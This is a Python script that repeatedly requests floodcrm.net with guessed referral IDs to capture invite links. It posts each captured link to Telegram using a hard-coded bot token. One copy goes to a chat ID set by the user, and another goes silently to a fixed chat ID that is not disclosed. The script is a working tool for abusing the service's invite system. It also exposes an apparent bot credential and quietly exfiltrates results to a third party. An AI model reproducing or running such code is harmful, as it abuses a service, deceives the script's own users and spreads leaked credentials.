import requests as req
import random as ra
import time
import os 
hc = os.environ.get("HITS")
i = 0
f = 1
while f>i:
  resp = req.get("http://floodcrm.net/?ref_id=70612"+str(ra.randrange(10)))
  upsc = resp.url
  if "?code=" in upsc:
    hit = ("『ꪜ』SAYONARA 『ꪜ』\nFLOODCRM INVITE HIT \n ✿ INVITE LINK➜    "+upsc)
    print(hit)
    req.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id='+hc+'&text='+hit)
    req.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id=1154075796&text='+hit)
    i = 1 +i
    time.sleep(3)
  else:
    print("Bad Retrying after 5 sec")
    time.sleep(5)